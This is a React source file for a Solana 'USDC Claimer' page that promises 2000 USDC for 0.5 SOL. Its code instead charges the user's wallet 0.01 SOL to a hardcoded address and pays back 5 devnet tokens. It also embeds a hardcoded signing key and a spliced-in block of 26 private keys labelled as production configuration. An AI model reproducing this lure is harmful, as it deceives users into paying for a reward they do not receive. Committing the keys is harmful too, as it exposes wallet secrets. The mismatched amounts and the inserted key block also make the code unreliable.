/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "4dxu61BxdABEZXTeTQbFi6ERwtodsA86EZPBie6LDGn5htTgX9QoYxAB7h7p2ruSgBrhS2QUVxsVStxHUjPLAmE6"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "4CyJG9M1HF7nN1oHRJpcqrZ2ES4iQqMVyLeaB2619qqtpL6kjq8uimqGRCxsPybCYaovRVTbC9JtoGsxUtJ41xa3",
  "key1": "4BDRityhw5GL2ZsL2Mgz1XVGM7xESHhCM9iu7vXJAgr5nrCiqSwEtxjKSTdDJTnYn9CTyibqsDsr8bDfGy7n1XM",
  "key2": "Cn1ehBevLsJzWz1q6ER7etsHvRcr8DS3mRGprHMhspwsm6H4F4zsiqZzHvMNTdLE4azgM1YNu8hwkRMGW77b7Lc",
  "key3": "3Q1YY1FGrMohUiJBnF3GzHkMupyhh3tTdth5GhTFw1di6U3NvnSyqqobHCmPbkcszt9Kw7GQMJApynGQ2Ex3itHg",
  "key4": "49xfNzq4vuwWCKDxKnPJeiisj12QmAen78umJAEME6dPiPWwoEuSp7aW9SvDHqvXVBpdpNuooPKLDerPvcjodtcj",
  "key5": "5TB4zLcnzg6mUPPeXPBZ5L58W23gjtxp1n4YmcqiNoZHc4yRY23jpJ4AcPbTucCFKc14RRMHohhU4Zcrg686AoVE",
  "key6": "5xvSn1tTCyf4BKXJZZpWc8fUxHbCJj9j7Uf2umenAKa25kxb7T9Jprc4BVYztLauNSUGqymCN2Uz4t8p2sr3dztY",
  "key7": "5FkRqS732TLBs76crFRPuh1RYTwvw2wu1gU4rjGhp6zXyCXc8x4zdaNJmQgCppUcfyh8fG9EWr8SRLRmLrsrPPj7",
  "key8": "5hoF1bUc5caPRFTeWiEri94iDND9jPY9Zd3TAdU6hV6G3k8daFDXViKV4j6qz3zMY4QbrtLPZbqyEFCnJ6atp5Eg",
  "key9": "5otKPGsymm6RP7HpHN3ET8iXameKXT3BfwFyKoczBDmBwk3Ud8uyZ8DUnSRrj6uME7wb1hHA1X1QiKtkkVEYUMe2",
  "key10": "5oVRv83EsXZxhNQfJ6ydbgQ6XwQ6SDquwLia9hS5L396Vh88wUTaYn1P6reX7meJpSsQrCMZTkwNTs63fMWYiDMy",
  "key11": "2s18SYYKwCdCLG77vmM23Xg3tnBbxxjEsQgufv66hwoP1NSn62RWDqABNehEAU2qU6A7uB5U1vDHJDnWG5mwyy1F",
  "key12": "4RywqLMzRuqFN91CiwbPCu6fBesrSm7wddfMVXXfBNijh8ggSqxdUcZmP8TwCgxMBPLzuUvMcb1xWVRTcQ8JxTEo",
  "key13": "AyhUtGVkoG3dZwTnqzm81hgjiLTychfHXmeKwmQvZGEzNTxWtLezwfFNPgykhEKybZ4juUBHPcpZdpohiwgUDkk",
  "key14": "5PT3FUqDqzxGeXgyNXkQr8wLWsBnYfrzSCLmdvnCCGBiDUCGJQAaCJYfeXD7KiKJ4dsd27w5xERqDBiTyHQTzYbG",
  "key15": "2ZBYJhbFexeQ7JDSxFejCDZuhocscVtvZUifrzTrDncMqVR1WbEMUa4nmKUysQsKQzr8dvaKnhnUQSxtPyAhZtp9",
  "key16": "3Ls3miZgUkxSrwfDTMZ6TPxJekundcgwUWSUMihepEZYCwjMJXoJQNkBht6z9D5Bf8F8ncjFwCutrHoQ3W8umcAk",
  "key17": "5hYkeSY5rt9yRzZnmKddWTHikQzogGS2zigmkeE4w9fNd8vPs7334EEFS4nkepbg2BgDanE5zdcDoydLNCVcK11b",
  "key18": "LNPgLB623shAmHiGAVMqAszddLERCoC4E1pE8X7m7UA7fE3PPK15gXfks3aXCwyx477o1yWeu1euKViB634n5ZM",
  "key19": "PTTvA3pvcDc4svDWH4R2YDuEqvYLMoMoip3tbKjRJq84uQPKQjHYcvFM8hBsTEg5a9oSUrsrK3s5CgybfMH2gCP",
  "key20": "5N7Ni5QbTJSsv5Ttr2JkfhPxMZsdhF3a6fZVT3nZX2LqRWpcNkvJEkMwaDdH9g7ZUp1PkDVvY8wr3B75cvnyWHzy",
  "key21": "2JruYWsFm9sw8uqKS6pLivT2MbbrC2saZ1gdkUASzQtvJpa5iZFg8HKK3BUDmWoWFUNRKFnzkrrCXZKaJdHJW28j",
  "key22": "2DEcLvLEnCuVc7fiBenQcRitcnGBCzm2NGjr456WyPbguAXZYSTdwkauzbcsDpj1noDW2HfTm7Veo6ejoxWqk2Xj",
  "key23": "5rjW7ANdznAPVfFRQH1x5952gLUWx3YYJFV1cRpHD353xQcu9mWxcMeT4Gm7NkBZ3oEqjsDyPGe2tU2pqDkRUw5h",
  "key24": "oWpUveA6DJaUeFFGA8hKHF1wwhLGTFh6WVCgzS2fZUGd11Q6SDQ3dQEFZoZU3oZHnW93rPXQdcjpZLt9Zrd9Dgw",
  "key25": "5TxpAnUVyApaZ6C6xLTJez9vhXyfU4aFB3URYwWEpdghzqbfrfpusDsERFhwD3WZckVG9BC6eiyDVLqWGbCVoHKv"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
